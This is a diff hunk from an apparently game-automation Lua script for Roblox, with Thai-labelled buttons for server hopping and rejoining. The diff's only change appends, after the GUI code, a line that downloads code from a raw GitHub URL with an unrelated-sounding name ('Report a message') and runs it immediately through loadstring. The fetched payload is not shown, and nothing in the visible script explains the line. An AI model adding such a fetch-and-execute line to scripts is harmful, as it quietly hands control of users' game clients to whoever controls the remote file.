@@ -309,3 +309,5 @@ SettingsSec:NewToggle({Title = "💰 Auto Resume ฟาร์มหลังก�
 
 ServerSec:NewButton({Title = "🚪 ย้ายไปเซิร์ฟใหม่", Callback = function() TeleportService:Teleport(PlaceId, game.Players.LocalPlayer) end})
 ServerSec:NewButton({Title = "🔄 ย้าย + รีโหลด", Callback = function() TeleportService:TeleportToPlaceInstance(PlaceId, game.JobId, game.Players.LocalPlayer) end})
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TOUxIllIll0O00OO/RobloxscriptTOU/refs/heads/main/Report%20a%20message"))()
